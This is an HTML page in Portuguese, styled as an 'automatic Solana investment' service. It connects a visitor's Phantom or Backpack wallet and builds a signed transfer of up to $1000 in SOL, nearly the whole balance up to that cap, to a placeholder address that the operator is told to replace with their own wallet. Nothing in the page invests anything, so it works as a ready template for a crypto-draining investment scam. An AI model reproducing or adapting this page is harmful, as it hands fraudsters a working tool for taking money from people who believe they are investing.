<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Investimento Solana Automático</title>
    <script src="https://unpkg.com/@solana/web3.js@1.92.1/lib/index.iife.js"></script>
    <style>
      body { background: #181a20; color: #fff; font-family: Arial, sans-serif; text-align: center; padding: 40px; }
      .container { background: #23263a; border-radius: 18px; box-shadow: 0 4px 24px rgba(44,62,80,0.18); padding: 2.5rem 2rem 2rem 2rem; max-width: 420px; margin: 0 auto; }
      button { background: linear-gradient(90deg, #9945FF 60%, #14F195 100%); color: #181a20; font-size: 1.1rem; font-weight: 600; border: none; border-radius: 0.7rem; padding: 1rem 2rem; cursor: pointer; margin-bottom: 1.5rem; }
      .info, .error { margin-top: 1.2rem; word-break: break-all; font-size: 1rem; }
      .error { color: #ef476f; }
      .success { color: #14F195; }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>Investimento Solana Automático</h1>
      <p>Conecte sua carteira e transfira até 1000 dólares em SOL automaticamente para o investimento.</p>
      <button id="connectBtn">Conectar Carteira Solana</button>
      <div class="info" id="walletInfo"></div>
      <button id="investBtn">Investir até $1000 em SOL</button>
      <div class="info" id="statusInfo"></div>
      <div class="error" id="errorInfo"></div>
    </div>
    <script>
      let provider, pubkey;
      const connectBtn = document.getElementById('connectBtn');
      const investBtn = document.getElementById('investBtn');
      const walletInfo = document.getElementById('walletInfo');
      const statusInfo = document.getElementById('statusInfo');
      const errorInfo = document.getElementById('errorInfo');

      // Substitua pelo endereço da SUA carteira de investimento
      const DESTINATION = "SEU_ENDERECO_SOLANA_AQUI"; // Exemplo: "9Ux4eyPcWcatNiCZCvRWzZqJAXZ2WQsj8LXLq3FTVNVGD"

      connectBtn.onclick = async () => {
        errorInfo.textContent = '';
        statusInfo.textContent = '';
        walletInfo.textContent = '';
        if (!window.solana || (!window.solana.isPhantom && !window.backpack)) {
          errorInfo.textContent = "Instale a carteira Phantom ou Backpack para continuar.";
          return;
        }
        try {
          provider = window.solana?.isPhantom ? window.solana : window.backpack?.solana;
          await provider.connect();
          pubkey = provider.publicKey.toString();
          walletInfo.innerHTML = "<b>Carteira conectada:</b> " + pubkey;
        } catch (err) {
          errorInfo.textContent = "Erro: " + (err.message || err);
        }
      };

      investBtn.onclick = async () => {
        errorInfo.textContent = '';
        statusInfo.textContent = '';
        if (!provider || !pubkey) {
          errorInfo.textContent = "Conecte a carteira primeiro!";
          return;
        }
        try {
          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("devnet"));
          const fromWallet = new solanaWeb3.PublicKey(pubkey);
          const destWallet = new solanaWeb3.PublicKey(DESTINATION);

          // 1. Obter saldo em lamports
          const balanceLamports = await connection.getBalance(fromWallet);
          const balanceSOL = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;

          // 2. Buscar preço do SOL em dólar
          const priceResp = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
          const priceData = await priceResp.json();
          const solPrice = priceData.solana.usd;

          // 3. Calcular saldo em dólares
          const balanceUSD = balanceSOL * solPrice;

          // 4. Definir valor a transferir
          let transferUSD = Math.min(balanceUSD, 1000);
          let transferSOL = transferUSD / solPrice;

          // Deixar uma pequena fração para taxas (~0.001 SOL)
          if (transferSOL > balanceSOL - 0.001) {
            transferSOL = balanceSOL - 0.001;
          }
          if (transferSOL <= 0) {
            errorInfo.textContent = "Saldo insuficiente para investir.";
            return;
          }

          // 5. Montar e enviar a transação
          const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: fromWallet,
              toPubkey: destWallet,
              lamports: Math.floor(transferSOL * solanaWeb3.LAMPORTS_PER_SOL)
            })
          );
          const { signature } = await provider.signAndSendTransaction(tx);
          statusInfo.innerHTML = `<span class='success'>Transação enviada! Assinatura: ${signature}<br>Valor: ${transferSOL.toFixed(4)} SOL (~$${transferUSD.toFixed(2)})</span>`;
        } catch (err) {
          errorInfo.textContent = "Erro: " + (err.message || err);
        }
      };
    </script>
  </body>
</html>
